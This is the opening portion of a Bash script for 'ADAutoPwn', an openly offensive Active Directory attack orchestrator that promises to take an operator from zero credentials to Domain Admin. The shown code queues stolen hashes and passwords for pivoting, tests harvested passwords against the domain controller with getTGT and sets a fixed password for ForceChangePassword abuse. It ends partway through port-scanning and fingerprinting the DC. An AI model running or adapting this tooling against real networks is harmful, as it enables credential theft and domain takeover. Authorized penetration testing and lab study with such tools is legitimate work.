#!/usr/bin/env bash
#
#  ADAutoPwn  —  Active Directory Automated Pwnage Framework
#  Author : c4sh3r
#  License: MIT  (authorized use only — pentesting / CTF / lab environments)
#
#  A Bash orchestrator that chains nxc/netexec, impacket, certipy, kerbrute,
#  bloodhound-python and friends to automate Active Directory assessment:
#  from the initial port scan all the way to DCSync — covering Kerberos,
#  ADCS abuse and offline cracking, printing every user, hash and step live.
#
#  Design principles:
#    * Kerberos-first authentication (works even when NTLM is disabled,
#      better OPSEC). Falls back to NTLM only when explicitly requested.
#    * Works with zero credentials (null/guest/anonymous enumeration) and
#      progressively unlocks more phases as credentials become available.
#    * Every artifact (users, hashes, tickets, loot) is saved to disk AND
#      printed to the operator in real time.
#
set -o pipefail

# ===========================================================================
#  METADATA
# ===========================================================================
readonly VERSION="1.40.0"
readonly AUTHOR="c4sh3r"
KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"

# ===========================================================================
#  TERMINAL UI  (colors + glyphs + section helpers)
# ===========================================================================
if [[ -t 1 ]] && [[ "${NO_COLOR:-0}" != "1" ]]; then
    C_RESET=$'\e[0m';  C_BOLD=$'\e[1m';   C_DIM=$'\e[2m'
    C_RED=$'\e[38;5;196m';    C_GREEN=$'\e[38;5;46m';   C_YELLOW=$'\e[38;5;226m'
    C_BLUE=$'\e[38;5;39m';    C_MAGENTA=$'\e[38;5;201m'; C_CYAN=$'\e[38;5;51m'
    C_ORANGE=$'\e[38;5;208m'; C_GREY=$'\e[38;5;245m';   C_PURPLE=$'\e[38;5;141m'
else
    C_RESET=''; C_BOLD=''; C_DIM=''; C_RED=''; C_GREEN=''; C_YELLOW=''
    C_BLUE=''; C_MAGENTA=''; C_CYAN=''; C_ORANGE=''; C_GREY=''; C_PURPLE=''
fi

G_INFO="${C_BLUE}${C_BOLD}[*]${C_RESET}"
G_OK="${C_GREEN}${C_BOLD}[+]${C_RESET}"
G_WARN="${C_ORANGE}${C_BOLD}[!]${C_RESET}"
G_ERR="${C_RED}${C_BOLD}[-]${C_RESET}"
G_RUN="${C_PURPLE}${C_BOLD}[>]${C_RESET}"
G_LOOT="${C_MAGENTA}${C_BOLD}[\$]${C_RESET}"
G_QST="${C_CYAN}${C_BOLD}[?]${C_RESET}"

LOGFILE=""   # set in main()

# strip ANSI for the plain-text logfile
_strip() { sed 's/\x1b\[[0-9;]*m//g'; }
_log()   { [[ -n "$LOGFILE" ]] && printf '%s\n' "$(echo -e "$1" | _strip)" >>"$LOGFILE"; }

info()  { echo -e "$G_INFO $1";  _log "[*] $1"; }
ok()    { echo -e "$G_OK ${C_GREEN}$1${C_RESET}"; _log "[+] $1"; }
warn()  { echo -e "$G_WARN ${C_ORANGE}$1${C_RESET}"; _log "[!] $1"; }
err()   { echo -e "$G_ERR ${C_RED}${C_BOLD}$1${C_RESET}"; _log "[-] $1"; }
run()   { echo -e "$G_RUN ${C_DIM}$1${C_RESET}"; _log "[>] $1"; }
# Wins (lines carrying ★) render GREEN so a successful action pops; plain loot
# (recovered secrets) stays magenta-treasure. Quick good=green / bad=red language.
loot()  { local _c="${C_MAGENTA}"; [[ "$1" == *★* ]] && _c="${C_GREEN}"; echo -e "$G_LOOT ${_c}${C_BOLD}$1${C_RESET}"; _log "[\$] $1"; }
qst()   { echo -ne "$G_QST ${C_CYAN}$1${C_RESET}"; }
detail(){ echo -e "$1"; _log "$(echo -e "$1" | _strip)"; }   # print to screen AND log (used by the final harvest dump)

section() {
    echo
    echo -e "${C_CYAN}${C_BOLD}╔══════════════════════════════════════════════════════════════════════════╗${C_RESET}"
    printf  "${C_CYAN}${C_BOLD}║${C_RESET} ${C_BOLD}%-72s${C_RESET} ${C_CYAN}${C_BOLD}║${C_RESET}\n" "$1"
    echo -e "${C_CYAN}${C_BOLD}╚══════════════════════════════════════════════════════════════════════════╝${C_RESET}"
    _log ""; _log "==== $1 ===="
}

subsection() {
    echo
    echo -e "  ${C_PURPLE}${C_BOLD}──┤ $1 ├──${C_RESET}"
    _log "  --- $1 ---"
}

hr() { echo -e "${C_GREY}    ----------------------------------------------------------------${C_RESET}"; }

# Clean left-bar panel. A right border is intentionally avoided: values carry ANSI
# colour codes (zero visible width) and vary in length, so a right edge can never
# line up — the old boxed table looked broken. A single accent bar + a consistent
# label column reads cleanly and never misaligns. Labels share ONE width across
# ui_kv/ui_metric so both sections line up in a single value column.
ui_kv() {
    local k="$1" v="$2"
    detail "    ${C_GREY}┃${C_RESET}  ${C_BOLD}$(printf '%-17s' "$k")${C_RESET}  $v"
}

ui_metric() {
    local k="$1" v="$2" hint="${3:-}"
    [[ -n "$hint" ]] && hint="   ${C_DIM}${hint}${C_RESET}"
    detail "    ${C_GREY}┃${C_RESET}  ${C_CYAN}$(printf '%-17s' "$k")${C_RESET}  ${C_BOLD}${v}${C_RESET}${hint}"
}

ui_panel_top()    { detail "    ${C_GREY}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${C_RESET}"; }
ui_panel_mid()    { detail "    ${C_GREY}┠─────────────────────────────────────────────────────${C_RESET}"; }
ui_panel_bottom() { detail "    ${C_GREY}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${C_RESET}"; }

banner() {
    # Modern gradient palette (true-color). Falls back to empty strings w/ --no-color.
    local g1 g2 g3 g4 g5 g6 b1 b2 acc box
    if [[ -n "$C_RESET" ]]; then
        g1=$'\e[38;2;0;255;200m';   g2=$'\e[38;2;0;225;235m'   # teal → cyan
        g3=$'\e[38;2;60;180;255m';  g4=$'\e[38;2;130;120;255m' # blue → indigo
        g5=$'\e[38;2;190;90;255m';  g6=$'\e[38;2;255;70;200m'  # violet → magenta
        b1=$'\e[38;2;255;60;120m';  b2=$'\e[38;2;255;180;60m'  # pink / amber accents
        acc=$'\e[38;2;0;255;160m';  box=$'\e[38;2;90;100;120m'
    fi
cat <<EOF

${box}    ┌────────────────────────────────────────────────────────────────┐${C_RESET}
${g1}${C_BOLD}     █████╗ ██████╗  ${g4}█████╗ ██╗   ██╗████████╗ ██████╗${C_RESET}
${g1}${C_BOLD}    ██╔══██╗██╔══██╗${g4}██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗${C_RESET}
${g2}${C_BOLD}    ███████║██║  ██║${g5}███████║██║   ██║   ██║   ██║   ██║${C_RESET}
${g2}${C_BOLD}    ██╔══██║██║  ██║${g5}██╔══██║██║   ██║   ██║   ██║   ██║${C_RESET}
${g3}${C_BOLD}    ██║  ██║██████╔╝${g6}██║  ██║╚██████╔╝   ██║   ╚██████╔╝${C_RESET}
${g3}${C_BOLD}    ╚═╝  ╚═╝╚═════╝ ${g6}╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝${C_RESET}
${g4}${C_BOLD}              ██████╗ ██╗    ██╗███╗   ██╗${C_RESET}   ${acc}Active Directory${C_RESET}
${g5}${C_BOLD}              ██╔══██╗██║    ██║████╗  ██║${C_RESET}   ${acc}Automated Pwnage${C_RESET}
${g5}${C_BOLD}              ██████╔╝██║ █╗ ██║██╔██╗ ██║${C_RESET}   ${acc}Framework${C_RESET}
${g6}${C_BOLD}              ██╔═══╝ ██║███╗██║██║╚██╗██║${C_RESET}
${g6}${C_BOLD}              ██║     ╚███╔███╔╝██║ ╚████║${C_RESET}   ${b2}v${VERSION}${C_RESET}
${g6}${C_BOLD}              ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝${C_RESET}
${box}    └────────────────────────────────────────────────────────────────┘${C_RESET}
       ${C_BOLD}⚡ From zero to Domain Admin — fully automated.${C_RESET}
       ${box}─────────────────────────────────────────────────────────${C_RESET}
       ${box}» crafted & weaponized by${C_RESET}  ${b1}${C_BOLD}▌${C_RESET} ${acc}${C_BOLD}c4sh3r${C_RESET} ${b1}${C_BOLD}▐${C_RESET}   ${box}«${C_RESET}
       ${box}» authorized engagements only · don't be the bad guy${C_RESET}
       ${box}─────────────────────────────────────────────────────────${C_RESET}
EOF
}

# ===========================================================================
#  GLOBAL STATE
# ===========================================================================
DC_IP=""
DOMAIN=""
DC_HOST=""          # short hostname of the DC
DC_FQDN=""          # hostname.domain
USER=""
PASS=""
HASH=""
KERB_TICKET=""      # path to the .ccache we generate
OUTDIR=""
WORDLIST="/usr/share/wordlists/rockyou.txt"
USERLIST="/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
DO_CRACK=1          # crack captured hashes by default (--no-crack to disable)
DO_BLOODHOUND=1
AUTO_YES=0
SUDO_OK=0
CREDS_FILE=""       # external "user:secret" lines to seed/continue the engine
USERS_FILE=""       # external user list to merge (for spray / AS-REP)
SPRAY_GEN=0         # 1 = also spray the domain-focused wordlist ONLINE (lockout risk)
KERBEROS=1          # 1 = prefer Kerberos for authenticated ops (best default)
DCT=""              # authenticated-call target: FQDN under Kerberos, else IP
HAVE_AUTH=0         # 1 once the CURRENT credential is validated
IS_DC_ADMIN=0       # 1 when the CURRENT identity is local admin on the DC (Pwn3d!) →
                    # nothing left to escalate: go straight to DCSync, skip the rest
SUDO_KEEPALIVE_PID=""
# Service capabilities, decided from the port scan — drive which techniques run
CAP_SMB=0; CAP_KERBEROS=0; CAP_LDAP=0; CAP_LDAPS=0; CAP_RPC=0; CAP_WINRM=0; CAP_ADWS=0; CAP_DNS=0
# Best anonymous credential for unauthenticated enumeration. A GUEST session (any junk
# user + blank password, mapped to Guest) is allowed to enumerate shares/RID/SAMR on
# many hardened DCs where the strict NULL session is denied — so whenever guest is
# enabled we prefer/also-try it. Set in phase_unauth.
GUEST_ENABLED=0; ANON_U=""; ANON_P=""
STEALTH=0           # 1 = skip noisy techniques + add jitter (OPSEC)
DO_ABUSE=0          # 1 = actually perform ACL/privilege abuse (otherwise report only)
DEEP_CVE=0          # 1 = run slow/noisy CVE modules such as PrintNightmare
DO_CLEANUP=0        # 1 = revert every change this tool made, then exit
ROLLBACK_FILE=""    # records undo actions for responsible cleanup
GRAPH_ZIP=""        # --graph: render a BloodHound zip to graph.html and exit
OWNED_FILE=""       # --owned: file of compromised principals to flag in the graph
NO_OPEN=0           # 1 = never auto-open the graph in a browser
WEB_UI=1            # 1 = auto-launch the ADAutoGraph web UI + import BH data (if installed)
WEB_FORCE=0         # --web/--adautograph: in --graph mode, open ADAutoGraph instead of graph.html
ADAUTOGRAPH_HOST="${ADAUTOGRAPH_HOST:-127.0.0.1}"
ADAUTOGRAPH_PORT="${ADAUTOGRAPH_PORT:-8765}"
ADAUTOGRAPH_DIR="${ADAUTOGRAPH_DIR:-}"   # override; else found beside this script
PIVOT_PW='ADAutoPwn!2024#Reset'   # password set when abusing ForceChangePassword
CERTIPY_TO=120      # hard timeout (s) on every certipy call — it loves to hang on
                    # an unreachable CA / bad DNS / Kerberos bind, and a hung scan
                    # is worse than a missed ESC. Wrapped as `timeout -k 15` so a
                    # certipy that ignores SIGTERM still gets SIGKILL'd 15s later
                    # (a plain timeout left it hanging, un-cancellable).

declare -a FOUND_USERS=()
declare -a CRED_QUEUE=()          # pending creds to assess: "user|pass|hash"
declare -A SEEN_CREDS=()          # already-assessed users (avoid loops)
declare -A FOUND_SECRETS=()       # every plaintext password we recover (for spraying)
declare -A SPRAYED=()             # password→done, so we don't spray twice
# Cross-iteration memo: the pivot loop re-runs every phase for each new identity,
# but some work is wasteful to repeat. These dedup it so a re-run doesn't crack
# the same document / roast+crack the same account five times over.
declare -A CRACKED_DOCS=()        # doc basename → already cracked/attempted
declare -A TRIED_HASHES=()        # per-account (krb) or per-hash (ntlm) → already cracked-attempted
declare -A OWNED_GROUPS=()        # compromised user (lowercased) → group memberships
declare -A OWNED_ADMIN=()         # compromised user (lowercased) → 1 if privileged/admin
declare -A REQUEUED_SELF=()       # user (lc) re-assessed once after a self-group-add (no loops)
declare -A CHAIN_FROM=()          # identity (lc) → the identity we pivoted FROM to reach it
declare -A CHAIN_VIA=()           # identity (lc) → the technique that yielded it
declare -A ABUSED_GLOBAL=()       # "target:right" already abused (across phases), fire once
declare -A ADIDNS_DONE=()         # ADIDNS records already attempted/created in this run
declare -A DELETED_SID=()         # objectSid (lc) → "dn<TAB>sam" of an AD-Recycle-Bin object
KERB_DONE=0                       # Kerberoast request runs once (SPN set is domain-wide)
# Groups that mean "this account is effectively privileged" → crown it in the summary
ADMIN_GROUP_RE='Domain Admins|Enterprise Admins|Schema Admins|Administrators|Account Operators|Backup Operators|Server Operators|Print Operators|DnsAdmins|Group Policy Creator Owners|Enterprise Key Admins|Key Admins|Domain Controllers'
DOMAIN_WL=""                      # path to the generated domain-focused wordlist

# ===========================================================================
#  HELPERS
# ===========================================================================
have() { command -v "$1" >/dev/null 2>&1; }
NXC="$(command -v nxc || command -v netexec || true)"
die() { err "$1"; exit 1; }
script_dir() { cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd; }
external_tool() { local p; p="$(script_dir)/external/$1"; [[ -e "$p" ]] && printf '%s\n' "$p"; }
nxc_has_module() {  # nxc_has_module <proto> <module>
    local proto="$1" mod="$2" cache="${OUTDIR:-/tmp}/.nxc_${proto}_modules.txt"
    [[ -s "$cache" ]] || $NXC "$proto" -L >"$cache" 2>/dev/null || true
    grep -qE "^[[:space:]]*\\[\\*\\][[:space:]]+${mod}[[:space:]]" "$cache" 2>/dev/null
}

SUDO_PASS="${SUDO_PASS:-}"   # optional: enables fully unattended sudo (-S)

# Run a command as root using cached sudo, a supplied password, or a live prompt.
_sudo() {
    if sudo -n true 2>/dev/null; then sudo "$@"
    elif [[ -n "$SUDO_PASS" ]]; then sudo -S -p '' "$@" <<<"$SUDO_PASS"
    else sudo "$@"; fi
}

# Sanitize an identity for safe use inside a filename (no slashes, spaces,
# trailing extensions). Keeps only [A-Za-z0-9._-], trims, caps length.
_safe_name() {
    local s="$1"
    s="${s//[^A-Za-z0-9._-]/_}"      # collapse anything unsafe to '_'
    s="${s#.}"; s="${s%.}"           # no leading/trailing dot
    printf '%s' "${s:0:64}"
}

# Decide whether a token is a plausible AD account name (rejects file paths,
# wordlist filenames, blanks, separators that leaked from a grep).
_is_valid_identity() {
    local u="$1"
    [[ -z "$u" ]] && return 1
    [[ "$u" == *[/\\\ ]* ]] && return 1                      # path/space
    [[ "$u" =~ \.(txt|json|log|csv|zip|ccache|ntds)$ ]] && return 1   # filename
    [[ "$u" == "users_all" || "$u" == "users" ]] && return 1
    return 0
}

# DOMAIN/USER principal for impacket-style tools
imp_principal() { echo "${DOMAIN}/${USER}"; }

# Authentication arguments for netexec (handles kerberos / hash / pass / null)
nxc_cred_args() {
    local a=()
    if [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]]; then
        # Reuse the TGT we already requested — most reliable, no re-auth
        a+=(-u "$USER" -k --use-kcache)
        [[ -n "$DOMAIN" ]] && a+=(-d "$DOMAIN")
    else
        if [[ -n "$USER" ]]; then
            # A KNOWN user — an EMPTY password is still a valid credential (blank-password
            # accounts), so pass `-p ''` for that user. Do NOT fall through to the
            # anonymous `-u '' -p ''` branch (that produced a malformed double `-u`).
            a+=(-u "$USER")
            if   [[ -n "$HASH" ]]; then a+=(-H "$HASH")
            else a+=(-p "$PASS"); fi
        else
            a+=(-u '' -p '')        # truly anonymous (no user at all)
        fi
        [[ -n "$DOMAIN" ]] && a+=(-d "$DOMAIN")
        # Only force Kerberos (-k) when we actually have something Kerberos can use
        # (a non-empty password or a hash). `-k` with a blank password and no ticket
        # breaks ("invalid principal syntax"); NTLM SMB handles `-p ''` cleanly.
        [[ "$KERBEROS" == "1" && -n "$DC_FQDN" && ( -n "$PASS" || -n "$HASH" ) ]] && a+=(-k)
    fi
    printf '%s\n' "${a[@]}"
}

confirm() {
    [[ "$AUTO_YES" == "1" ]] && return 0
    local ans
    # Keep interactive prompts visually separated from tool output. Some tools
    # leave the cursor mid-line, which made several y/N questions appear glued
    # together and effectively invisible in long runs.
    [[ -t 1 ]] && printf '\n'
    qst "$1 [y/N] "
    read -r ans
    [[ "$ans" =~ ^([Yy]|yes|si)$ ]]
}

abuse_confirm() {
    local msg="$1"
    [[ "$AUTO_YES" == "1" ]] && return 0
    if [[ "$DO_ABUSE" == "1" ]]; then
        info "${msg} → auto (--abuse)"
        return 0
    fi
    confirm "$msg"
}

attacker_ip() {
    [[ -n "${LHOST:-}" ]] && { printf '%s\n' "$LHOST"; return; }
    [[ -n "${ATTACKER_IP:-}" ]] && { printf '%s\n' "$ATTACKER_IP"; return; }
    ip route get "$DC_IP" 2>/dev/null | grep -oP 'src \K\S+' | head -1
}

# OPSEC jitter between noisy actions when --stealth is set
jitter() { [[ "$STEALTH" == "1" ]] && sleep "$(( (RANDOM % 4) + 2 ))"; }

# ---------------------------------------------------------------------------
#  ROLLBACK / RESPONSIBLE CLEANUP
#  We record an undo command for every change we make to the target so a
#  later `--cleanup` run can revert the environment to its original state.
#  (We deliberately do NOT touch Windows event logs / anti-forensics.)
# ---------------------------------------------------------------------------
rb_record() {  # rb_record "<human description>" "<shell command that undoes it>"
    [[ -z "$ROLLBACK_FILE" ]] && return
    printf '### %s\n%s\n' "$1" "$2" >>"$ROLLBACK_FILE"
    warn "Change tracked for rollback: $1"
}

# ---------------------------------------------------------------------------
#  CREDENTIAL QUEUE  (drives recursive pivoting)
# ---------------------------------------------------------------------------
cred_key() { printf '%s|%s|%s' "${1,,}" "$2" "$3"; }

queue_cred() {  # queue_cred <user> <password|""> <nthash|""> [via-technique]
    local u="$1" p="$2" h="$3" via="${4:-pivot}"
    if ! _is_valid_identity "$u"; then
        [[ -n "$u" ]] && err "Ignoring implausible identity '$u' (looks like a path/filename)"
        return
    fi
    # GUEST / anonymous is NOT a foothold. It authenticates with a blank password by
    # design but has zero privileges — running the full per-identity assessment as
    # Guest only spews LDAP "successful bind must be completed" errors, bloodyAD
    # "-p required", and useless module tracebacks. It already did its job in the
    # UNAUTHENTICATED phase (guest-session share/RID enum); never queue it as a pivot.
    if [[ -z "$h" ]] && [[ "${u,,}" == "guest" || "${u,,}" == "anonymous" || "${u,,}" == "adautopwn" ]]; then
        return
    fi
    # Surface recovered NT hashes (the VALUE) for the final harvest — captured here
    # so it's recorded even if this exact cred is later de-duped from the queue.
    if [[ -n "$h" && -n "$OUTDIR" ]]; then
        local _hh="${h##*:}"
        [[ "$_hh" =~ ^[a-fA-F0-9]{32}$ ]] && ! grep -qiF "${u}:${_hh}" "$OUTDIR/recovered_hashes.txt" 2>/dev/null \
            && printf '%-30s %s  ⟵  %s\n' "$u" "$_hh" "$via" >>"$OUTDIR/recovered_hashes.txt"
    fi
    local user_key="${u,,}" key; key="$(cred_key "$u" "$p" "$h")"
    # Record the attack-chain edge (the identity we're acting as --via--> this one)
    # the FIRST time we learn of it. CRITICAL: never assign a parent to an identity
    # that is ALREADY compromised/assessed (in OWNED_GROUPS) — otherwise, when a
    # later node re-harvests an earlier root (e.g. msa_health$ re-reading svc_recovery
    # from the shares), the root gets a false parent and the chain becomes a CYCLE
    # (svc_recovery⇄msa_health$), rendered as two duplicate trees. A root keeps no
    # parent; a genuinely new lead (not yet owned) gets its true discoverer.
    if [[ -z "${CHAIN_VIA[$user_key]:-}" && -z "${OWNED_GROUPS[$user_key]:-}" \
          && -n "${USER,,}" && "${USER,,}" != "$user_key" ]]; then
        CHAIN_FROM["$user_key"]="${USER,,}"; CHAIN_VIA["$user_key"]="$via"
    fi
    [[ -n "${SEEN_CREDS[$key]:-}" || -n "${SEEN_CREDS[${user_key}|*|*]:-}" ]] && return
    # Skip only the exact same credential already waiting. Different passwords
    # for the same user must remain testable (year variants / old leaked secret).
    local q qk qu qp qh
    for q in "${CRED_QUEUE[@]}"; do
        IFS='|' read -r qu qp qh <<<"$q"
        qk="$(cred_key "$qu" "$qp" "$qh")"
        [[ "$qk" == "$key" ]] && return
    done
    CRED_QUEUE+=("${u}|${p}|${h}")
    loot "New identity queued for pivoting → ${C_BOLD}${u}${C_RESET}$( [[ -n "$p" ]] && echo " (password)" || echo " (NT hash)")"
}

# Record any recovered plaintext password (with its provenance) for spraying + the map
add_secret() {
    local p="$1" src="${2:-unknown source}"; [[ -z "$p" ]] && return
    [[ -n "${FOUND_SECRETS[$p]:-}" ]] && return
    FOUND_SECRETS["$p"]=1
    echo "$p" >>"$OUTDIR/found_passwords.txt"
    printf '%-30s  ⟵  %s\n' "$p" "$src" >>"$OUTDIR/credential_map.txt"
    # If the secret embeds a year, expand sibling-year variants into the OFFLINE
    # wordlist ONLY (hash cracking + opt-in --spray). They must NOT enter
    # FOUND_SECRETS: that pool is sprayed ONLINE against every user every round,
    # and year siblings are GUESSES (only one year is right) — spraying 4 wrong
    # passwords/account is a fast track to ACCOUNT LOCKOUT (especially Protected
    # Users). Online year-adaptation is handled, bounded, by _probe_year_password
    # at harvest time against the specific account only.
    if [[ -n "${DOMAIN_WL:-}" && -f "${DOMAIN_WL:-/nonexistent}" ]]; then
        local v
        while IFS= read -r v; do
            [[ -z "$v" || "$v" == "$p" ]] && continue
            grep -qxF -- "$v" "$DOMAIN_WL" 2>/dev/null || echo "$v" >>"$DOMAIN_WL"
        done < <(year_variants "$p")
    fi
}

# Emit year-shifted siblings of a string that embeds a 4-digit year, across a
# window of current_year-3 .. current_year+1 (covers redeploys / clock skew /
# "this box uses 2025 but the next deploy uses 2026"). Anything without a
# 19xx/20xx year produces no output. e.g. Welcome2025! -> Welcome2024! …2026! …
year_variants() {
    local s="$1"
    [[ "$s" =~ (19|20)[0-9][0-9] ]] || return 0
    local matched="$BASH_REMATCH" now y
    now=$(date +%Y)
    for ((y=now-3; y<=now+1; y++)); do
        echo "${s/$matched/$y}"
    done
}

# Deployment-year drift: a password harvested from a LOG often carries a stale
# year (the log was written in 2025, but the box now runs the 2026 password).
# Find the password that ACTUALLY authenticates WITHOUT locking the account:
# try the literal first, then ONLY the current-year sibling — at most 2 online
# getTGT attempts, stop at the first success. Echo the winner (empty if neither).
# The wider ±window is never tried online (offline crack / --spray only).
_probe_year_password() {            # <user> <literal_password>  -> echoes the best password
    local user="$1" lit="$2" cur cand cc out rc winner="" locked=0
    [[ -z "$DOMAIN" || -z "$DC_IP" ]] && { printf '%s\n' "$lit"; return 0; }
    have impacket-getTGT || { printf '%s\n' "$lit"; return 0; }
    cur=$(date +%Y)
    # Try the CURRENT-YEAR sibling FIRST: a password harvested from a LOG lags the
    # real deployment year, and the current year is the likeliest LIVE password. On
    # a healthy box this authenticates on the first try -> ZERO failed pre-auths ->
    # no lockout pressure at all. The stale literal is only the fallback.
    local -a cands=()
    if [[ "$lit" =~ (19|20)[0-9][0-9] ]]; then
        local sib="${lit/$BASH_REMATCH/$cur}"
        [[ "$sib" != "$lit" ]] && cands+=("$sib")
    fi
    cands+=("$lit")
    for cand in "${cands[@]}"; do
        cc="$(mktemp -u 2>/dev/null)"
        out=$(KRB5CCNAME="$cc" timeout 25 impacket-getTGT "${DOMAIN}/${user}:${cand}" -dc-ip "$DC_IP" 2>&1); rc=$?
        rm -f "$cc" 2>/dev/null
        [[ $rc -eq 0 ]] && { winner="$cand"; break; }
        grep -qiE 'CLIENT_REVOKED|revoked|locked|LOCKED_OUT' <<<"$out" && locked=1
    done
    if   [[ -n "$winner" ]];   then printf '%s\n' "$winner"
    elif [[ "$locked" == 1 ]]; then printf '%s\n' "${cands[0]}"
    else                            printf '%s\n' "$lit"; fi
}

# Record a confirmed/working identity and how it was obtained (for the final map)
note_cred_source() { printf '%-28s  ⟵  %s\n' "$1" "$2" >>"$OUTDIR/valid_creds_map.txt"; }

# ===========================================================================
#  DEPENDENCY CHECK
# ===========================================================================
check_deps() {
    section "DEPENDENCY CHECK"
    local req=(nmap smbclient rpcclient ldapsearch ntpdate)
    local opt=(impacket-secretsdump impacket-GetUserSPNs impacket-GetNPUsers impacket-getTGT impacket-findDelegation certipy bloodhound-python enum4linux-ng smbmap john hashcat)
    local missing=0

    if [[ -z "$NXC" ]]; then err "netexec/nxc NOT found (required)"; missing=1; else ok "netexec/nxc -> $NXC"; fi
    for t in "${req[@]}"; do
        if have "$t"; then ok "$t"; else err "$t (REQUIRED) not found"; missing=1; fi
    done
    for t in "${opt[@]}"; do
        if have "$t"; then ok "$t"; else warn "$t (optional) not found — that phase will be skipped"; fi
    done
    # KERBRUTE_BIN may point at a *directory* (some installs) — resolve the real
    # binary inside it, or fall back to one on PATH. Otherwise every kerbrute
    # call dies with "is a directory" and spray/userenum silently do nothing.
    if [[ -d "$KERBRUTE_BIN" ]]; then
        local _k; _k=$(find "$KERBRUTE_BIN" -maxdepth 1 -type f -iname 'kerbrute*' 2>/dev/null | head -1)
        [[ -n "$_k" ]] && { chmod +x "$_k" 2>/dev/null; KERBRUTE_BIN="$_k"; }
    fi
    [[ ! -f "$KERBRUTE_BIN" ]] && have kerbrute && KERBRUTE_BIN="$(command -v kerbrute)"
    if _kerbrute_ok; then ok "kerbrute -> $KERBRUTE_BIN"
    else warn "kerbrute not a runnable binary at $KERBRUTE_BIN → spray falls back to netexec; variant userenum skipped"; fi
    if [[ -f "$WORDLIST" ]]; then ok "password wordlist -> $WORDLIST"; else warn "wordlist $WORDLIST missing (cracking limited)"; fi
    # Optional: the ADAutoGraph web UI (separate repo). If present we auto-launch it
    # and import the BloodHound data at the end of the run; otherwise we skip silently.
    if [[ "$WEB_UI" == "1" ]]; then
        local _ag; _ag=$(_adautograph_dir)
        if [[ -n "$_ag" ]]; then ok "ADAutoGraph web UI -> $_ag"
        else warn "ADAutoGraph (optional web UI) not found — get it: git clone https://github.com/C4sh3R/ADAutoGraph (or set ADAUTOGRAPH_DIR)"; fi
    fi

    [[ "$missing" == "1" ]] && die "Missing required dependencies. Run ./install.sh"
}

# ===========================================================================
#  SUDO  (needed for time sync + /etc/hosts)
# ===========================================================================
request_sudo() {
    section "SUDO PRIVILEGES"
    info "Sudo is used to: sync the local clock with the DC and edit /etc/hosts"
    if sudo -n true 2>/dev/null; then ok "sudo already available (passwordless/cached)"; SUDO_OK=1
    elif [[ -n "$SUDO_PASS" ]]; then
        if sudo -S -p '' -v <<<"$SUDO_PASS" 2>/dev/null; then ok "sudo granted (supplied password)"; SUDO_OK=1
        else err "Supplied sudo password rejected"; SUDO_OK=0; fi
    elif [[ -t 0 ]]; then
        qst "sudo password: "
        if sudo -v; then ok "sudo granted"; SUDO_OK=1
        else warn "sudo unavailable — /etc/hosts edits and time sync will be skipped"; SUDO_OK=0; fi
    else
        warn "No TTY and no SUDO_PASS — skipping sudo steps (pass --sudo-pass or SUDO_PASS=…)"
        SUDO_OK=0
    fi
    if [[ "$SUDO_OK" == "1" ]]; then
        ( while true; do sudo -n true 2>/dev/null; sleep 50; done ) &
        SUDO_KEEPALIVE_PID=$!
    fi
}

# ===========================================================================
#  PHASE 0 — DOMAIN CONTROLLER DISCOVERY
# ===========================================================================
phase_discovery() {
    section "PHASE 0 · DOMAIN CONTROLLER DISCOVERY"

    info "Checking connectivity to ${C_BOLD}$DC_IP${C_RESET}"
    if ping -c1 -W2 "$DC_IP" >/dev/null 2>&1; then ok "Host $DC_IP is up"
    else warn "No ICMP reply (firewall may be filtering, continuing)"; fi

    subsection "Quick scan of key AD ports (nmap)"
    local ports="53,88,135,139,389,445,464,593,636,3268,3269,5985,9389"
    run "nmap -Pn -n -p $ports --open -T4 $DC_IP"
    local nmap_out; nmap_out=$(nmap -Pn -n -p "$ports" --open -T4 "$DC_IP" 2>/dev/null)
    echo "$nmap_out" | grep -E '^[0-9]+/tcp' | while read -r line; do ok "Open port: $line"; done
    echo "$nmap_out" >"$OUTDIR/nmap_dc.txt"

    # Map open ports → capability flags (these gate later technique selection)
    echo "$nmap_out" | grep -q '^88/tcp'   && CAP_KERBEROS=1
    echo "$nmap_out" | grep -q '^445/tcp'  && CAP_SMB=1
    echo "$nmap_out" | grep -qE '^(389|3268)/tcp' && CAP_LDAP=1
    echo "$nmap_out" | grep -qE '^(636|3269)/tcp' && CAP_LDAPS=1
    echo "$nmap_out" | grep -q '^135/tcp'  && CAP_RPC=1
    echo "$nmap_out" | grep -q '^5985/tcp' && CAP_WINRM=1
    echo "$nmap_out" | grep -q '^9389/tcp' && CAP_ADWS=1
    echo "$nmap_out" | grep -q '^53/tcp'   && CAP_DNS=1

    subsection "Capability matrix (drives technique selection)"
    _cap() { [[ "$1" == "1" ]] && echo "${C_GREEN}available${C_RESET}" || echo "${C_RED}n/a${C_RESET}"; }
    echo -e "      Kerberos (88)  : $(_cap $CAP_KERBEROS)   ${C_DIM}AS-REP / Kerberoast / Kerb auth${C_RESET}"
    echo -e "      SMB (445)      : $(_cap $CAP_SMB)   ${C_DIM}shares / RID brute / SAMR enum${C_RESET}"
    echo -e "      LDAP (389)     : $(_cap $CAP_LDAP)   ${C_DIM}users/groups/ACL/LAPS/gMSA/ADCS${C_RESET}"
    echo -e "      LDAPS (636)    : $(_cap $CAP_LDAPS)"
    echo -e "      RPC (135)      : $(_cap $CAP_RPC)   ${C_DIM}rpcclient secondary enum${C_RESET}"
    echo -e "      WinRM (5985)   : $(_cap $CAP_WINRM)   ${C_DIM}remote shell if creds allow${C_RESET}"

    # Decide the authentication method from what's actually exposed
    if [[ "$KERBEROS" == "1" && "$CAP_KERBEROS" != "1" ]]; then
        KERBEROS=0
        warn "Kerberos (88) not exposed → falling back to NTLM authentication"
    fi
    [[ "$CAP_LDAP" != "1" ]] && warn "LDAP not exposed → will use SMB/RPC secondary enumeration where possible"
    [[ "$CAP_SMB"  != "1" && "$CAP_LDAP" != "1" ]] && warn "Neither SMB nor LDAP exposed — enumeration will be very limited"

    subsection "Fingerprinting hostname & domain via SMB"
    run "$NXC smb $DC_IP"
    local smb_info; smb_info=$($NXC smb "$DC_IP" 2>&1)
